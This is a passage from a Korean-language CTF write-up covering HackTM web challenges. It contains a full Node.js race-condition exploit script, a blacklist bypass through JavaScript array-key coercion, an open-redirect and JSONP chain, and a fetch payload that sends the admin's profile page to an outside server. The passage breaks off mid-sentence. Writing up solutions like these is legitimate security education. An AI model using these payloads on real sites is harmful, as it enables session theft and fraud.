class="comment">// Get server info</span></span><br><span class="line">  <span class="comment">// Only for logged in users</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> user = users[req.user.id] || &#123; <span class="attr">rights</span>: [] &#125;;</span><br><span class="line">  <span class="keyword">let</span> info = user.rights.map(<span class="function"><span class="params">i</span> =&gt;</span> (&#123; <span class="attr">name</span>: i, <span class="attr">value</span>: config[i] &#125;));</span><br><span class="line">  res.json(ok(&#123; <span class="attr">info</span>: info &#125;));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>config.n</code> 값은 <code>/serverInfo</code> 에서 알아낼 수 있습니다.<br><code>user.rights.map</code> 함수를 통하여 config[n] 값을 반환하도록 할 수 있는 가능성을 제공합니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">"/updateUser"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">let</span> rights = req.body.rights || [];</span><br><span class="line">  <span class="keyword">if</span> (rights.length &gt; <span class="number">0</span> &amp;&amp; checkRights(rights)) &#123;</span><br><span class="line">    users[uid].rights = user.rights.concat(rights).filter(onlyUnique);</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkRights</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> blacklist = [<span class="string">"p"</span>, <span class="string">"n"</span>, <span class="string">"port"</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> element = arr[i];</span><br><span class="line">    <span class="keyword">if</span> (blacklist.includes(element)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>따라서 위에서 설명했던 <code>/updateUser</code> 페이지를 통해 <code>user.rights</code> 에서 <code>n</code> 값을 넣어주면 되는데<br><code>checkRights</code> 함수에서 <code>blacklist.includes</code> 를 통해 <code>p</code>, <code>n</code>, <code>post</code> 등의 문자열 값이 입력으로 들어올 경우 거부됩니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">A = &#123;<span class="string">'key'</span>: <span class="string">'value'</span>&#125;</span><br><span class="line"><span class="comment">// &#123;key: "value"&#125;</span></span><br><span class="line">A[<span class="string">'key'</span>]</span><br><span class="line"><span class="comment">// "value"</span></span><br><span class="line">A[[<span class="string">'key'</span>]]</span><br><span class="line"><span class="comment">// "value"</span></span><br></pre></td></tr></table></figure><p>자바스크립트에서는 첨자를 사용하여 객체를 참조할 때, 키 값으로 문자열 이외의 값이 들어올 경우, 원시 타입으로 변환하여 키로 사용합니다.<br>따라서 <code>checkRights</code> 함수에서 입력으로 <code>{&quot;rights&quot;:[[&quot;n&quot;]]}</code> 과 같은 배열을 넣어줄 경우에, <code>blacklist.includes</code> 를 우회하여 <code>/serverInfo</code> 애서 <code>config.n</code> 값을 확인하도록 할 수 있습니다.</p><p>이후 <code>/init</code> 에서 <code>q</code> 값을 <code>1</code>으로, <code>p</code> 값으로 알아낸 <code>config.n</code> 값을 넣어주면 <code>req.user.id</code> 값을 0으로 만들 수 있고, <code>/flag</code> 에서 플래그를 확인할 수 있습니다.</p><h2 id="280pts-My-Bank"><a href="#280pts-My-Bank" class="headerlink" title="[280pts] My Bank"></a>[280pts] <a href="#my-bank">My Bank</a></h2><blockquote><p>Who’s got my money?<br>Please abstain from brute-forcing files.<br><a href="http://178.128.175.6:50090/" target="_blank" rel="noopener">http://178.128.175.6:50090/</a><br>Author: nytr0gen</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// exploit.js</span></span><br><span class="line"><span class="keyword">const</span> request = <span class="built_in">require</span>(<span class="string">'request'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">solve</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    request(<span class="string">'http://178.128.175.6:50090/register'</span>, (err, res, body) =&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> cookie = res.headers[<span class="string">'set-cookie'</span>][<span class="number">0</span>].split(<span class="string">';'</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">let</span> token = <span class="regexp">/csrf_token.+value="([^"]+)"/</span>.exec(body)[<span class="number">1</span>];</span><br><span class="line">        request(<span class="string">'http://178.128.175.6:50090/register'</span>, &#123;</span><br><span class="line">            <span class="string">"method"</span>: <span class="string">"POST"</span>,</span><br><span class="line">            <span class="string">"headers"</span>: &#123;</span><br><span class="line">                <span class="string">"Cookie"</span>: cookie,</span><br><span class="line">                <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">"body"</span>: <span class="string">"csrf_token="</span> + token + <span class="string">"&amp;username=posix"</span></span><br><span class="line">        &#125;, (err, res, body) =&gt; &#123;</span><br><span class="line">            <span class="keyword">let</span> cookie = res.headers[<span class="string">'set-cookie'</span>][<span class="number">0</span>].split(<span class="string">';'</span>)[<span class="number">0</span>];</span><br><span class="line">            request(<span class="string">'http://178.128.175.6:50090/'</span>, &#123;</span><br><span class="line">                <span class="string">"headers"</span>: &#123;</span><br><span class="line">                    <span class="string">"Cookie"</span>: cookie</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,(err, res, body) =&gt; &#123;</span><br><span class="line">                <span class="keyword">let</span> token = <span class="regexp">/csrf_token.+value="([^"]+)"/</span>.exec(body)[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">let</span> cookie = res.headers[<span class="string">'set-cookie'</span>][<span class="number">0</span>].split(<span class="string">';'</span>)[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">let</span> queue = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; ++i) &#123;</span><br><span class="line">                    queue += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">                    request(<span class="string">'http://178.128.175.6:50090/'</span>, &#123;</span><br><span class="line">                        <span class="string">"method"</span>: <span class="string">"POST"</span>,</span><br><span class="line">                        <span class="string">"headers"</span>: &#123;</span><br><span class="line">                            <span class="string">"Cookie"</span>: cookie,</span><br><span class="line">                            <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">                        &#125;,</span><br><span class="line">                        <span class="string">"body"</span>: <span class="string">"csrf_token="</span> + token + <span class="string">"&amp;loan=100"</span></span><br><span class="line">                    &#125;, (err, res, body) =&gt; &#123;</span><br><span class="line">                        queue -= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (queue === <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="keyword">let</span> cookie = res.headers[<span class="string">'set-cookie'</span>][<span class="number">0</span>].split(<span class="string">';'</span>)[<span class="number">0</span>];</span><br><span class="line">                            request(<span class="string">'http://178.128.175.6:50090/'</span>, &#123;</span><br><span class="line">                                <span class="string">"headers"</span>: &#123;</span><br><span class="line">                                    <span class="string">"Cookie"</span>: cookie</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;, (err, res, body) =&gt; &#123;</span><br><span class="line">                                <span class="keyword">let</span> money = <span class="regexp">/Money: ([^ ]+)/</span>.exec(body)[<span class="number">1</span>];</span><br><span class="line">                                money = <span class="built_in">parseInt</span>(money.replace(<span class="regexp">/,/g</span>, <span class="string">''</span>))</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">if</span> (money &gt;= <span class="number">1400</span>) &#123;</span><br><span class="line">                                    get_flag(cookie);</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    <span class="built_in">console</span>.log(<span class="string">'[*] Trying, Got '</span> + money);</span><br><span class="line">                                    solve();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;)</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params">cookie</span>) </span>&#123;</span><br><span class="line">    request(<span class="string">'http://178.128.175.6:50090/store'</span>, &#123;</span><br><span class="line">        <span class="string">"headers"</span>: &#123;</span><br><span class="line">            <span class="string">"Cookie"</span>: cookie</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, (err, res, body) =&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> token = <span class="regexp">/csrf_token.+value="([^"]+)"/</span>.exec(body)[<span class="number">1</span>];</span><br><span class="line">        request(<span class="string">'http://178.128.175.6:50090/store'</span>, &#123;</span><br><span class="line">            <span class="string">"method"</span>: <span class="string">"POST"</span>,</span><br><span class="line">            <span class="string">"headers"</span>: &#123;</span><br><span class="line">                <span class="string">"Cookie"</span>: cookie,</span><br><span class="line">                <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">"body"</span>: <span class="string">"csrf_token="</span> + token + <span class="string">"&amp;item=1337"</span></span><br><span class="line">        &#125;, (err, res, body) =&gt; &#123;</span><br><span class="line">            <span class="keyword">let</span> cookie = res.headers[<span class="string">'set-cookie'</span>][<span class="number">0</span>].split(<span class="string">';'</span>)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">            request(<span class="string">'http://178.128.175.6:50090/store'</span>, &#123;</span><br><span class="line">                <span class="string">"headers"</span>: &#123;</span><br><span class="line">                    <span class="string">"Cookie"</span>: cookie</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, (err, res, body) =&gt; &#123;</span><br><span class="line">                <span class="keyword">let</span> flag = <span class="regexp">/HackTM&#123;.*&#125;/</span>.exec(body)[<span class="number">0</span>];</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"[!] flag is "</span> + flag);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">solve();</span><br></pre></td></tr></table></figure><p>레이스 컨디션 취약점을 통해 <code>600.00 tBTC</code> 이상의 돈을 빌릴 수 있습니다.<br>이후 <code>/store</code> 에서 플래그를 구입하면 됩니다.</p><h2 id="497pts-mIRC-3rd-solve"><a href="#497pts-mIRC-3rd-solve" class="headerlink" title="[497pts] mIRC (3rd solve)"></a>[497pts] <a href="#mirc">mIRC</a> (3rd solve)</h2><blockquote><p>The new Yahoo! Messenger. Dirbuster will not help you with anything. The admin should be talkative.<br><a href="http://178.128.175.6:40080/" target="_blank" rel="noopener">http://178.128.175.6:40080/</a><br>Author: nytr0gen</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; http:&#x2F;&#x2F;178.128.175.6:40080&#x2F;login?next&#x3D;http:&#x2F;&#x2F;rwx.kr&#x2F;1.js</span><br><span class="line">&#x2F;&#x2F; if logged in, redirect to (http:&#x2F;&#x2F;rwx.kr&#x2F;1.js)</span><br><span class="line"></span><br><span class="line">POST &#x2F;register HTTP&#x2F;1.1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">csrf_token&#x3D;&lt;token&gt;&amp;username&#x3D;..&#x2F;..&#x2F;login?next&#x3D;http:&#x2F;&#x2F;rwx.kr&#x2F;1.js?x&#x3D;?&amp;password&#x3D;123</span><br></pre></td></tr></table></figure><p><code>http://178.128.175.6:40080/login?next=http://attacker.com</code> 의 <code>open redirection</code> 취약점이 존재하고 로그인 시, 유저명에 url 을 입력할 수 있습니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"chat-personalization"</span> <span class="attr">data-chat_url</span>=<span class="string">"/api/messages/"</span> <span class="attr">data-param</span>=<span class="string">"admin"</span> <span class="attr">data-start_qualifier</span>=<span class="string">"__P"</span> <span class="attr">data-end_qualifier</span>=<span class="string">"P__"</span> <span class="attr">data-source_path_empty</span>=<span class="string">""</span> <span class="attr">data-disable_cache</span>=<span class="string">"true"</span> <span class="attr">data-css_selector</span>=<span class="string">".chatform_hidden"</span> <span class="attr">data-last_update</span>=<span class="string">"1580610880.0"</span> <span class="attr">class</span>=<span class="string">"hidden"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>/messages?username=admin</code> 에서 관리자와 대화할 수 있는 기능이 주어지는데<br>페이지 중간에 위와 같은 태그가 존재합니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"chat-personalization"</span> <span class="attr">data-chat_url</span>=<span class="string">"/api/messages/"</span> <span class="attr">data-param</span>=<span class="string">"../../login?next=http://rwx.kr/1.js?x=?"</span> <span class="attr">data-start_qualifier</span>=<span class="string">"__P"</span> <span class="attr">data-end_qualifier</span>=<span class="string">"P__"</span> <span class="attr">data-source_path_empty</span>=<span class="string">""</span> <span class="attr">data-disable_cache</span>=<span class="string">"true"</span> <span class="attr">data-css_selector</span>=<span class="string">".chatform_hidden"</span> <span class="attr">data-last_update</span>=<span class="string">"1580610880.0"</span> <span class="attr">class</span>=<span class="string">"hidden"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>data-param</code> 부분에 대화하는 상대방의 유저명이 포함되며, 예를 들어 <code>../../login?next=http://rwx.kr/1.js?x=?</code> 이라는 이름으로 가입한 경우 위와 같은 상태가 됩니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNewMessages</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> chat = $(<span class="string">"#chat-personalization"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!chat.length) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> chat_url = chat.data(<span class="string">"chat_url"</span>);</span><br><span class="line">    <span class="keyword">var</span> param = chat.data(<span class="string">"param"</span>);</span><br><span class="line">    <span class="keyword">var</span> start_qualifier = chat.data(<span class="string">"start_qualifier"</span>);</span><br><span class="line">    <span class="keyword">var</span> end_qualifier = chat.data(<span class="string">"end_qualifier"</span>);</span><br><span class="line">    <span class="keyword">var</span> source_path_empty = chat.data(<span class="string">"source_path_empty"</span>);</span><br><span class="line">    <span class="keyword">var</span> disable_cache = chat.data(<span class="string">"disable_cache"</span>);</span><br><span class="line">    <span class="keyword">var</span> css_selector = chat.data(<span class="string">"css_selector"</span>);</span><br><span class="line">    <span class="keyword">var</span> enable_decrypt = chat.data(<span class="string">"enable_decrypt"</span>);</span><br><span class="line">    <span class="keyword">var</span> last_update = +chat.data(<span class="string">"last_update"</span>) || <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!source_path_empty) &#123;</span><br><span class="line">      <span class="keyword">var</span> vid = param;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">typeof</span> vid != <span class="string">'undefined'</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> f = (disable_cache) ? vid.toLowerCase() : vid.toLowerCase().substring(<span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">var</span> c = (disable_cache) ? &#123;</span><br><span class="line">          _: <span class="keyword">new</span> <span class="built_in">Date</span>().getTime()</span><br><span class="line">        &#125; : &#123;&#125;;</span><br><span class="line">        <span class="comment">// personalize with backend data</span></span><br><span class="line">        <span class="keyword">var</span> ajax = $.getJSON(chat_url + f, c);</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    setInterval(checkNewMessages, <span class="number">2000</span>);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p><code>/static/app.js</code> 파일의 최하단을 확인해 보면 <code>chat_url + f</code> 을 인자로 하여 <code>$.getJSON</code> 함수를 실행하고 있습니다. <code>chat_url</code> 값을 고정으로 <code>/api/messages/</code> 이며 <code>f</code> 값은 유저명입니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.getJSON(<span class="string">'/api/message/'</span> + <span class="string">'../../login?next=http://rwx.kr/1.js?x=?'</span>)</span><br></pre></td></tr></table></figure><p>따라서 <code>../../login?next=http://rwx.kr/1.js?x=?</code> 를 유저명으로 하여 관리자에게 메시지를 보내면, 관리자는 위와 같은 형태의 함수 호출을 하게 됩니다.<br><code>url</code> 뒤에 <code>?x=?</code> 를 붙여준 이유는 jquery의 <code>getJSON</code> 함수가 이와 같은 형태의 <code>url</code> 을 인자로 받으면 <code>?</code> 부분에 <code>jQuery34108898913333225196_1580687420744</code> 와 같이 난수가 포함된 문자열로 요청을 시도하며, 받아온 결과값을 스크립트로서 실행하는 기능이 존재하기 때문입니다.</p><p>이러한 기능은 본래 <code>jsonp</code> 페이지를 지원하기 위해 존재하는 기능이지만, <code>open redirection</code> 취약점과 결합하면 공격자의 서버에서 임의의 스크립트를 받아와 실행하도록 할 수 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">'/profile'</span>).then(<span class="function"><span class="params">x</span> =&gt;</span> x.text()).then(<span class="function"><span class="params">x</span> =&gt;</span> &#123;</span><br><span class="line">    location = <span class="string">'http://rwx.kr/?d='</span> + btoa(x);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>서버에 스크립트를 저장해둔뒤, 관리자가 요청하도록 하였습니다.<br>이후 <code>fetch</code> 함수를 통해 <code>/profile</code> 페이지를 받아와 결과 페이지를 공격자 서버로 반환하도록 합니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"fullname"</span>&gt;</span>Fullname<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"fullname"</span> <span class="attr">name</span>=<span class="string">"fullname"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"HackTM&#123;3f07fcaba6c72e3ffb640bbe9dab0edad15c84e390b8c323aa0bc3178ad7c65b&#125;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>관리자에게 메시지를 보내 스크립트를 실행 시킨 후, 서버에 전송된 데이터를 디코딩 하여 확인해 보면, 관리자의 <code>fullname</code> 부분에 플래그가 존재하는 것을 확인할 수 있습니다.</p><h2 id="497pts-Humans-of-Dancers-4th-solve"><a href="#497pts-Humans-of-Dancers-4th-solve" class="headerlink" title="[497pts] Humans of Dancers (4th solve)"></a>[497pts] <a href="#humans-of-dancers">Humans of Dancers</a> (4th solve)</h2><blockquote><p>Please do not brute-force for any files or directories.<br>Recommended browser: Chrome<br><a href="http://178.128.175.6:20900/" target="_blank" rel="noopener">http://178.128.175.6:20900/</a></p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.freeze(location);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> DEFAULT_ROUTE = <span class="string">'/page/acasa'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> $page = $(<span class="string">'.page'</span>);</span><br><span class="line"><span class="keyword">var</span> $pageFrame = $page.find(<span class="string">'.page__frame'</span>);</span><br><span class="line"><span class="keyword">var</span> currentRoute = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> isValidUrl = <span class="function"><span class="keyword">function</span> (<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ((url.toLowerCase().startsWith(<span class="string">'//'</span>))) &#123;</span><br><span class="line">        url = <span class="string">"https:"</span> +  url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> isValidUrl = isValidJSURL(url);</span><br><span class="line">    <span class="keyword">let</span> isUrl = isValidPattern(url);</span><br><span class="line">    <span class="keyword">let</span> sameDomain = url.toLowerCase().startsWith(<span class="string">'/'</span>) &amp;&amp; !url.substr(<span class="number">1</span>).toLowerCase().startsWith(<span class="string">'/'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> ret = ((isValidUrl &amp;&amp; isUrl) || sameDomain);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> expression = <span class="regexp">/^(https?\:\/\/)?[a-zA-Z0-9_-]+(.[a-zA-Z0-9_-]+)*.[a-zA-Z]&#123;2,4&#125;(\/[a-zA-Z0-9_]+)&#123;0,15&#125;(\/[a-zA-Z0-9_]+.[a-zA-Z]&#123;2,4&#125;(\?[a-zA-Z0-9_]+\=[a-zA-Z0-9_]+)?)?(\&amp;[a-zA-Z0-9_]+\=[a-zA-Z0-9_]+)&#123;0,15&#125;$/gi</span>;</span><br><span class="line"><span class="keyword">var</span> regex = <span class="keyword">new</span> <span class="built_in">RegExp</span>(expression);</span><br><span class="line"><span class="keyword">var</span> isValidPattern = <span class="function"><span class="keyword">function</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> urlNoQueryString = url.split(<span class="string">'?'</span>)[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> (url != <span class="literal">null</span> &amp;&amp; !(urlNoQueryString.match(regex) === <span class="literal">null</span> || (url.split(<span class="string">" "</span>).length - <span class="number">1</span>) &gt; <span class="number">0</span>));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> isValidJSURL = <span class="function"><span class="keyword">function</span> (<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!(url.toLowerCase().startsWith(<span class="string">"http://"</span>) || url.toLowerCase().startsWith(<span class="string">'https://'</span>))) &#123;</span><br><span class="line">        url = <span class="string">'https://'</span> +  url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> toOpenUrl;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        toOpenUrl = <span class="keyword">new</span> URL(url);</span><br><span class="line">        <span class="keyword">return</span> toOpenUrl.origin !== <span class="string">'null'</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>/static/app.js</code> 파일을 확인해 보면 <code>hash</code> 값에 주어진 문자열을 인자로 하여 <code>isValidUrl</code> 함수를 호출하여 안전한 주소인지 확인한 후에, <code>iframe</code> 태그의 <code>src</code> 속성으로 설정합니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/^(https?\:\/\/)?[a-zA-Z0<span class="number">-9</span>_-]+(.[a-zA-Z0<span class="number">-9</span>_-]+)*.[a-zA-Z]&#123;<span class="number">2</span>,<span class="number">4</span>&#125;(\/[a-zA-Z0<span class="number">-9</span>_]+)&#123;<span class="number">0</span>,<span class="number">15</span>&#125;(\/[a-zA-Z0<span class="number">-9</span>_]+.[a-zA-Z]&#123;<span class="number">2</span>,<span class="number">4</span>&#125;(\?[a-zA-Z0<span class="number">-9</span>_]+\=[a-zA-Z0<span class="number">-9</span>_]+)?)?(\&amp;[a-zA-Z0<span class="number">-9</span>_]+\=[a-zA-Z0<span class="number">-9</span>_]+)&#123;<span class="number">0</span>,<span class="number">15</span>&#125;$/gi</span><br><span class="line"><span class="comment">// matches with https://javascript:80/1-%60html;t/aa/b/c,pa?a=1%60,alert(1) ...</span></span><br></pre></td></tr></table></figure><p>먼저 <code>isUrl</code> 에서 